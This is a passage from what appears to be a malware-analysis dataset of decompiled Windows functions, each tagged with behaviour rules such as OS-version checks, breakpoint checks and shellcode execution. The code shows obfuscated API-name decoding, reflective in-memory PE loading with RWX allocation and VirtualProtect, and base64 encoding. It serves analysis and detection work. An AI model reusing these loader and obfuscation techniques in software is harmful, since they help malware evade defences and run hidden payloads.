uStack180;\n    uchar uStack179;\n    uchar uStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack166;\n    uchar uStack165;\n    uchar uStack164;\n    uchar uStack163;\n    uchar uStack162;\n    uchar uStack161;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack156;\n    uchar uStack155;\n    uchar uStack154;\n    uchar uStack152;\n    uchar uStack151;\n    uchar uStack150;\n    uchar uStack149;\n    uchar uStack148;\n    uchar uStack147;\n    uchar uStack146;\n    uchar uStack145;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack139;\n    uchar uStack138;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar uStack134;\n    uchar uStack133;\n    uchar uStack132;\n    uchar uStack131;\n    uchar uStack130;\n    uchar uStack129;\n    uchar uStack128;\n    uchar uStack127;\n    uchar uStack126;\n    uchar uStack125;\n    uchar uStack124;\n    uchar uStack123;\n    uchar uStack122;\n    uchar uStack121;\n    uchar uStack120;\n    uchar uStack119;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack83;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    uStack72 = 0xfb;\n    uStack71 = 0xfc;\n    uStack70 = 0xfe;\n    uStack69 = 0xff;\n    uStack68 = 0xaa;\n    uStack67 = 0x58;\n    uStack66 = 0x4b;\n    uStack65 = 0x51;\n    uStack64 = 0x4d;\n    uStack63 = 0x53;\n    uStack62 = 0x4b;\n    uStack61 = 0x5b;\n    uStack60 = 0x36;\n    uStack59 = 0x6d;\n    uStack58 = 0x76;\n    uStack57 = 0x77;\n    uStack56 = 0;\n    uStack55 = 7;\n    uStack54 = 0x6d;\n    uStack53 = 0x4f;\n    uStack52 = 0x72;\n    uStack51 = 0x78;\n    uStack50 = 0x78;\n    uStack49 = 0x78;\n    uStack48 = 0x78;\n    uStack47 = 0;\n    arg1 = fcn.140006a6c(&uStack72);\n    uStack32 = fcn.1400012cc(arg1);\n    if (*0x14000a9c0 == NULL) {\n        uStack24 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(uStack32);\n    }\n    else {\n        uStack24 = (**0x14000a9c0)(uStack32);\n    }\n    uStack40 = uStack24;\n    uStack280 = 0xfb;\n    uStack279 = 0xfc;\n    uStack278 = 0xfe;\n    uStack277 = 0xff;\n    uStack276 = 0xaa;\n    uStack275 = 0x49;\n    uStack274 = 0x76;\n    uStack273 = 0x77;\n    uStack272 = 0x74;\n    uStack271 = 0x54;\n    uStack270 = 0x76;\n    uStack269 = 0x6c;\n    uStack268 = 0x76;\n    uStack267 = 0x5b;\n    uStack266 = 0x6f;\n    uStack265 = 0x7c;\n    uStack264 = 0x81;\n    uStack263 = 0x72;\n    uStack262 = 0x81;\n    uStack261 = 0x83;\n    uStack260 = 0x67;\n    uStack259 = 0;\n    uStack258 = 7;\n    uStack257 = 0x6d;\n    uStack256 = 0x4f;\n    uStack255 = 0x72;\n    uStack254 = 0x78;\n    uStack253 = 0x78;\n    uStack252 = 0x78;\n    uStack251 = 0x78;\n    uStack250 = 0;\n    fcn.140006a6c(&uStack280);\n    *0x14000aa80 = fcn.140002e3c(uStack40, &uStack280);\n    uStack312 = 0xfb;\n    uStack311 = 0xfc;\n    uStack310 = 0xfe;\n    uStack309 = 0xff;\n    uStack308 = 0xaa;\n    uStack307 = 0x4a;\n    uStack306 = 0x70;\n    uStack305 = 0x77;\n    uStack304 = 0x69;\n    uStack303 = 0x77;\n    uStack302 = 0x74;\n    uStack301 = 0x6c;\n    uStack300 = 0x7c;\n    uStack299 = 0x58;\n    uStack298 = 0x7a;\n    uStack297 = 0x70;\n    uStack296 = 0x7a;\n    uStack295 = 100;\n    uStack294 = 0;\n    uStack293 = 7;\n    uStack292 = 0x6d;\n    uStack291 = 0x4f;\n    uStack290 = 0x72;\n    uStack289 = 0x78;\n    uStack288 = 0x78;\n    uStack287 = 0x78;\n    uStack286 = 0x78;\n    uStack285 = 0;\n    fcn.140006a6c(&uStack312);\n    *0x14000a9c8 = fcn.140002e3c(uStack40, &uStack312);\n    uStack248 = 0xfb;\n    uStack247 = 0xfc;\n    uStack246 = 0xfe;\n    uStack245 = 0xff;\n    uStack244 = 0xaa;\n    uStack243 = 0x49;\n    uStack242 = 0x76;\n    uStack241 = 0x77;\n    uStack240 = 0x74;\n    uStack239 = 0x58;\n    uStack238 = 0x6b;\n    uStack237 = 0x75;\n    uStack236 = 0x6c;\n    uStack235 = 0x5b;\n    uStack234 = 0x6f;\n    uStack233 = 0x7c;\n    uStack232 = 0x81;\n    uStack231 = 0x72;\n    uStack230 = 0x81;\n    uStack229 = 0x83;\n    uStack228 = 0x67;\n    uStack227 = 0;\n    uStack226 = 7;\n    uStack225 = 0x6d;\n    uStack224 = 0x4f;\n    uStack223 = 0x72;\n    uStack222 = 0x78;\n    uStack221 = 0x78;\n    uStack220 = 0x78;\n    uStack219 = 0x78;\n    uStack218 = 0;\n    fcn.140006a6c(&uStack248);\n    *0x14000aa10 = fcn.140002e3c(uStack40, &uStack248);\n    uStack152 = 0xfb;\n    uStack151 = 0xfc;\n    uStack150 = 0xfe;\n    uStack149 = 0xff;\n    uStack148 = 0xaa;\n    uStack147 = 0x4a;\n    uStack146 = 0x70;\n    uStack145 = 0x77;\n    uStack144 = 0x69;\n    uStack143 = 0x77;\n    uStack142 = 0x74;\n    uStack141 = 0x6c;\n    uStack140 = 0x7c;\n    uStack139 = 0x4c;\n    uStack138 = 0x76;\n    uStack137 = 0x7a;\n    uStack136 = 0x7f;\n    uStack135 = 0x72;\n    uStack134 = 0x56;\n    uStack133 = 0x70;\n    uStack132 = 0x7e;\n    uStack131 = 0x75;\n    uStack130 = 0x7e;\n    uStack129 = 0x78;\n    uStack128 = 0;\n    uStack127 = 7;\n    uStack126 = 0x6d;\n    uStack125 = 0x4f;\n    uStack124 = 0x72;\n    uStack123 = 0x78;\n    uStack122 = 0x78;\n    uStack121 = 0x78;\n    uStack120 = 0x78;\n    uStack119 = 0;\n    fcn.140006a6c(&uStack152);\n    *0x14000aa70 = fcn.140002e3c(uStack40, &uStack152);\n    uStack216 = 0xfb;\n    uStack215 = 0xfc;\n    uStack214 = 0xfe;\n    uStack213 = 0xff;\n    uStack212 = 0xaa;\n    uStack211 = 0x4a;\n    uStack210 = 0x70;\n    uStack209 = 0x77;\n    uStack208 = 0x69;\n    uStack207 = 0x77;\n    uStack206 = 0x74;\n    uStack205 = 0x6c;\n    uStack204 = 0x7c;\n    uStack203 = 0x4c;\n    uStack202 = 0x79;\n    uStack201 = 0x79;\n    uStack200 = 0x7a;\n    uStack199 = 0x72;\n    uStack198 = 0x71;\n    uStack197 = 0x83;\n    uStack196 = 0x67;\n    uStack195 = 0;\n    uStack194 = 7;\n    uStack193 = 0x6d;\n    uStack192 = 0x4f;\n    uStack191 = 0x72;\n    uStack190 = 0x78;\n    uStack189 = 0x78;\n    uStack188 = 0x78;\n    uStack187 = 0x78;\n    uStack186 = 0;\n    fcn.140006a6c(&uStack216);\n    *0x14000aa48 = fcn.140002e3c(uStack40, &uStack216);\n    uStack184 = 0xfb;\n    uStack183 = 0xfc;\n    uStack182 = 0xfe;\n    uStack181 = 0xff;\n    uStack180 = 0xaa;\n    uStack179 = 0x4a;\n    uStack178 = 0x70;\n    uStack177 = 0x77;\n    uStack176 = 0x69;\n    uStack175 = 0x77;\n    uStack174 = 0x74;\n    uStack173 = 0x6c;\n    uStack172 = 0x7c;\n    uStack171 = 0x5b;\n    uStack170 = 0x6f;\n    uStack169 = 0x6c;\n    uStack168 = 0x70;\n    uStack167 = 0x53;\n    uStack166 = 0x77;\n    uStack165 = 0x7b;\n    uStack164 = 0x75;\n    uStack163 = 0;\n    uStack162 = 7;\n    uStack161 = 0x6d;\n    uStack160 = 0x4f;\n    uStack159 = 0x72;\n    uStack158 = 0x78;\n    uStack157 = 0x78;\n    uStack156 = 0x78;\n    uStack155 = 0x78;\n    uStack154 = 0;\n    fcn.140006a6c(&uStack184);\n    *0x14000aa40 = fcn.140002e3c(uStack40, &uStack184);\n    uStack112 = 0xfb;\n    uStack111 = 0xfc;\n    uStack110 = 0xfe;\n    uStack109 = 0xff;\n    uStack108 = 0xaa;\n    uStack107 = 0x49;\n    uStack106 = 0x76;\n    uStack105 = 0x77;\n    uStack104 = 0x74;\n    uStack103 = 0x46;\n    uStack102 = 0x6a;\n    uStack101 = 0x6b;\n    uStack100 = 0x5a;\n    uStack99 = 0x6e;\n    uStack98 = 0x7b;\n    uStack97 = 0x80;\n    uStack96 = 0x71;\n    uStack95 = 0x80;\n    uStack94 = 0x82;\n    uStack93 = 0x57;\n    uStack92 = 0x75;\n    uStack91 = 0x72;\n    uStack90 = 0x76;\n    uStack89 = 0x78;\n    uStack88 = 0x86;\n    uStack87 = 0x88;\n    uStack86 = 0x6d;\n    uStack85 = 0;\n    uStack84 = 7;\n    uStack83 = 0x6d;\n    uStack82 = 0x4f;\n    uStack81 = 0x72;\n    uStack80 = 0x78;\n    uStack79 = 0x78;\n    uStack78 = 0x78;\n    uStack77 = 0x78;\n    uStack76 = 0;\n    fcn.140006a6c(&uStack112);\n    *0x14000aa38 = fcn.140002e3c(uStack40, &uStack112);\n    return 1;\n}\n",
        "token_count": 4381
    },
    "140005bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar * fcn.140005bd4(uchar *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int64_t iStack64;\n    uint64_t uStack56;\n    uchar auStack48 [8];\n    uint32_t uStack40;\n    int64_t iStack32;\n    \n    iStack32 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg2, 0x80000000, 0, 0, 3, 0x80, 0);\n    if ((iVar2 == 0) || (iVar2 == -1)) {\n        puVar3 = auStack48;\n        puVar4 = arg1;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    else {\n        uStack40 = fcn.1400065c8(iVar2);\n        if (uStack40 == 0) {\n            puVar3 = auStack48;\n            puVar4 = arg1;\n            for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        else {\n            iStack32 = fcn.140006604(uStack40, 0x3000, 0x40);\n            uStack56 = 0;\n            iStack64 = 0;\n            do {\n                iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, iStack32 + iStack64, uStack40, &uStack56, 0);\n                if (iVar1 == 0) break;\n                iStack64 = iStack64 + uStack56;\n            } while (uStack56 == uStack40);\n            puVar3 = auStack48;\n            puVar4 = arg1;\n            for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 569
    },
    "140005fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140005fc4(void)\n\n{\n    int32_t iVar1;\n    uint64_t auStack24 [3];\n    \n    iVar1 = (**0x14000aa18)(0, 0, auStack24, 0, 0);\n    if (iVar1 == 0) {\n        auStack24[0] = 0;\n    }\n    else {\n        auStack24[0] = auStack24[0] / 0x40000000;\n    }\n    return auStack24[0];\n}\n",
        "token_count": 118
    },
    "14000601": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140006014(int64_t *arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uchar auStack28 [4];\n    uint64_t uStack24;\n    \n    if (arg2[2] == 0) {\n        uVar2 = 1;\n    }\n    else if ((*(arg2 + 3) & 0x2000000) == 0) {\n        uStack52 = (*(arg2 + 3) & 0x20000000) != 0;\n        uStack48 = (*(arg2 + 3) & 0x40000000) != 0;\n        uStack44 = (*(arg2 + 3) & 0x80000000) != 0;\n        uStack56 = *(uStack52 * 0x10 + 0x14000a9a0 + uStack48 * 8 + uStack44 * 4);\n        if ((*(arg2 + 3) & 0x4000000) != 0) {\n            uStack56 = uStack56 | 0x200;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(*arg2, arg2[2], uStack56, auStack28);\n        if (iVar1 == 0) {\n            fcn.140006a2c(\"Error protecting memory page\");\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    else {\n        if ((*arg2 == arg2[1]) &&\n           (((*(arg2 + 0x1c) != 0 || (*(*arg1 + 0x38) == *(arg1 + 0xd))) ||\n            (uStack24 = *(arg1 + 0xd),  arg2[2] % uStack24 == 0)))) {\n            (*arg1[6])(*arg2, arg2[2], 0x4000, arg1[0xb]);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 491
    },
    "1400061e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400061e4(int64_t *arg1, int64_t arg2)\n\n{\n    int32_t iStack24;\n    \n    iStack24 = *(arg2 + 0x10);\n    if (iStack24 == 0) {\n        if ((*(arg2 + 0x24) & 0x40) == 0) {\n            if ((*(arg2 + 0x24) & 0x80) != 0) {\n                iStack24 = *(*arg1 + 0x24);\n            }\n        }\n        else {\n            iStack24 = *(*arg1 + 0x20);\n        }\n    }\n    return iStack24;\n}\n",
        "token_count": 152
    },
    "1400062e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400062e8(int64_t arg1, ulong arg2, int64_t arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iStack40;\n    int64_t iStack32;\n    \n    iVar2 = arg4[1];\n    iStack32 = *arg4 + 0x18 + *(*arg4 + 0x14);\n    iStack40 = 0;\n    do {\n        if (*(*arg4 + 6) <= iStack40) {\n            return 1;\n        }\n        if (*(iStack32 + 0x10) == 0) {\n            uVar1 = *(arg3 + 0x38);\n            if (0 < uVar1) {\n                iVar4 = (*arg4[5])(iVar2 + *(iStack32 + 0xc), uVar1, 0x1000, 4, arg4[0xb]);\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                iVar4 = iVar2 + *(iStack32 + 0xc);\n                *(iStack32 + 8) = iVar4;\n                fcn.140002470(iVar4, 0, uVar1);\n            }\n        }\n        else {\n            iVar3 = fcn.140004a08(arg2, *(iStack32 + 0x14) + *(iStack32 + 0x10));\n            if (iVar3 == 0) {\n                return 0;\n            }\n            iVar4 = (*arg4[5])(iVar2 + *(iStack32 + 0xc), *(iStack32 + 0x10), 0x1000, 4, arg4[0xb]);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            iVar4 = iVar2 + *(iStack32 + 0xc);\n            fcn.140004830(iVar4, arg1 + *(iStack32 + 0x14), *(iStack32 + 0x10));\n            *(iStack32 + 8) = iVar4;\n        }\n        iStack40 = iStack40 + 1;\n        iStack32 = iStack32 + 0x28;\n    } while( true );\n}\n",
        "token_count": 513
    },
    "1400066a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400066a8(int64_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iStack88;\n    uint32_t *puStack80;\n    uint64_t *puStack72;\n    int64_t *piStack56;\n    int64_t iStack40;\n    \n    iVar3 = arg1[1];\n    iStack88 = 1;\n    if (*(*arg1 + 0x94) == 0) {\n        iStack88 = 1;\n    }\n    else {\n        puStack80 = iVar3 + *(*arg1 + 0x90);\n        while( true ) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(puStack80, 0x14);\n            if (iVar4 != 0) {\n                return iStack88;\n            }\n            if (puStack80[3] == 0) {\n                return iStack88;\n            }\n            iVar5 = (*arg1[7])(iVar3 + puStack80[3], arg1[0xb]);\n            if (iVar5 == 0) break;\n            if (arg1[2] == 0) {\n                iStack40 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(arg1[0xf], 0, *(arg1 + 3) + 1 << 3);\n            }\n            else {\n                iStack40 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(arg1[0xf], 0, arg1[2], *(arg1 + 3) + 1 << 3);\n            }\n            if (iStack40 == 0) {\n                (*arg1[9])(iVar5, arg1[0xb]);\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                return 0;\n            }\n            arg1[2] = iStack40;\n            *(arg1[2] + *(arg1 + 3) * 8) = iVar5;\n            *(arg1 + 3) = *(arg1 + 3) + 1;\n            if (*puStack80 == 0) {\n                uVar1 = puStack80[4];\n                uVar2 = puStack80[4];\n            }\n            else {\n                uVar1 = *puStack80;\n                uVar2 = puStack80[4];\n            }\n            piStack56 = iVar3 + uVar2;\n            for (puStack72 = iVar3 + uVar1; *puStack72 != 0; puStack72 = puStack72 + 1) {\n                if ((*puStack72 & 0x8000000000000000) == 0) {\n                    iVar6 = (*arg1[8])(iVar5, iVar3 + *puStack72 + 2, arg1[0xb]);\n                    *piStack56 = iVar6;\n                }\n                else {\n                    iVar6 = (*arg1[8])(iVar5, *puStack72 & 0xffff, arg1[0xb]);\n                    *piStack56 = iVar6;\n                }\n                if (*piStack56 == 0) {\n                    iStack88 = 0;\n                    break;\n                }\n                piStack56 = piStack56 + 1;\n            }\n            if (iStack88 == 0) {\n                (*arg1[9])(iVar5, arg1[0xb]);\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                return 0;\n            }\n            puStack80 = puStack80 + 5;\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x7e);\n        iStack88 = 0;\n    }\n    return iStack88;\n}\n",
        "token_count": 838
    },
    "140006b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140006b4c(void)\n\n{\n    ulong uVar1;\n    ulong uStack80;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    \n    uStack64 = 0xfb;\n    uStack63 = 0xfc;\n    uStack62 = 0xfe;\n    uStack61 = 0xff;\n    uStack60 = 0xaa;\n    uStack59 = 0x71;\n    uStack58 = 0x75;\n    uStack57 = 100;\n    uStack56 = 0x74;\n    uStack55 = 0x6e;\n    uStack54 = 0;\n    uStack53 = 7;\n    uStack52 = 0x6d;\n    uStack51 = 0x4f;\n    uStack50 = 0x72;\n    uStack49 = 0x78;\n    uStack48 = 0x78;\n    uStack47 = 0x78;\n    uStack46 = 0x78;\n    uStack45 = 0;\n    uVar1 = fcn.140006a6c(&uStack64);\n    uVar1 = fcn.1400012cc(uVar1);\n    if (*0x14000a9c0 == NULL) {\n        uStack80 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(uVar1);\n    }\n    else {\n        uStack80 = (**0x14000a9c0)(uVar1);\n    }\n    uStack40 = 0xfb;\n    uStack39 = 0xfc;\n    uStack38 = 0xfe;\n    uStack37 = 0xff;\n    uStack36 = 0xaa;\n    uStack35 = 0x46;\n    uStack34 = 0x70;\n    uStack33 = 0x78;\n    uStack32 = 0x71;\n    uStack31 = 0x55;\n    uStack30 = 0x78;\n    uStack29 = 0x76;\n    uStack28 = 0x6b;\n    uStack27 = 0x6e;\n    uStack26 = 0x7d;\n    uStack25 = 0x7e;\n    uStack24 = 0x71;\n    uStack23 = 0x80;\n    uStack22 = 0;\n    uStack21 = 7;\n    uStack20 = 0x6d;\n    uStack19 = 0x4f;\n    uStack18 = 0x72;\n    uStack17 = 0x78;\n    uStack16 = 0x78;\n    uStack15 = 0x78;\n    uStack14 = 0x78;\n    uStack13 = 0;\n    fcn.140006a6c(&uStack40);\n    *0x14000aa20 = fcn.140002e3c(uStack80, &uStack40);\n    return 1;\n}\n",
        "token_count": 921
    },
    "140006cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140006cb8(uint *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong arg2_00;\n    int64_t iVar1;\n    ulong auStack48 [2];\n    ulong uStack32;\n    ulong uStack24;\n    \n    arg2_00 = fcn.140006604(0xffff, 0x3000, 0x40);\n    auStack48[0] = 0;\n    iVar1 = fcn.140002644(*0x14000a9d8, arg2_00, auStack48);\n    uStack32 = 0;\n    uStack24 = 0;\n    if (iVar1 != 0) {\n        uStack24 = auStack48[0];\n        uStack32 = arg2_00;\n    }\n    *arg1 = uStack32;\n    arg1[1] = uStack32._4_4_;\n    arg1[2] = uStack24;\n    arg1[3] = uStack24._4_4_;\n    return arg1;\n}\n",
        "token_count": 245
    },
    "140006dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t fcn.140006dc4(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t auStack24 [6];\n    \n    uStack36 = 0;\n    uStack40 = 0;\n    for (uStack32 = 0; uStack32 < arg2; uStack32 = uStack32 + 1) {\n        auStack24[uStack36] = *(arg1 + uStack32);\n        uStack36 = uStack36 + 1;\n        if (uStack36 == 3) {\n            *(arg3 + uStack40) =\n                 \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[(auStack24[0] & 0xff) >> 2];\n            *(arg3 + uStack40 + 1) =\n                 \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                 [(auStack24[0] & 3) * 0x10 + ((auStack24[1] & 0xf0) >> 4)];\n            *(arg3 + uStack40 + 2) =\n                 \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                 [((auStack24[2] & 0xc0) >> 6) + (auStack24[1] & 0xf) * 4];\n            *(arg3 + uStack40 + 3) =\n                 \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[auStack24[2] & 0x3f];\n            uStack36 = 0;\n            uStack40 = uStack40 + 4;\n        }\n    }\n    if (uStack36 != 0) {\n        if (uStack36 == 1) {\n            auStack24[1] = 0;\n        }\n        *(arg3 + uStack40) =\n             \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[(auStack24[0] & 0xff) >> 2];\n        *(arg3 + uStack40 + 1) =\n             \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n             [(auStack24[0] & 3) * 0x10 + ((auStack24[1] & 0xf0) >> 4)];\n        if (uStack36 == 2) {\n            *(arg3 + uStack40 + 2) =\n                 \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[(auStack24[1] & 0xf) << 2];\n        }\n        else {\n            *(arg3 + uStack40 + 2) = 0x3d;\n        }\n        *(arg3 + uStack40 + 3) = 0x3d;\n        uStack40 = uStack40 + 4;\n    }\n    *(arg3 + uStack40) = 0;\n    return uStack40;\n}\n",
        "token_count": 620
    },
    "1400014f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.1400014fc(void)\n\n{\n    ulong arg1;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack286;\n    uchar uStack285;\n    uchar uStack284;\n    uchar uStack283;\n    uchar uStack282;\n    uchar uStack281;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack275;\n    uchar uStack274;\n    uchar uStack273;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack253;\n    uchar uStack252;\n    uchar uStack251;\n    uchar uStack250;\n    uchar uStack249;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack232;\n    uchar uStack231;\n    uchar uStack230;\n    uchar uStack229;\n    uchar uStack228;\n    uchar uStack227;\n    uchar uStack226;\n    uchar uStack225;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar 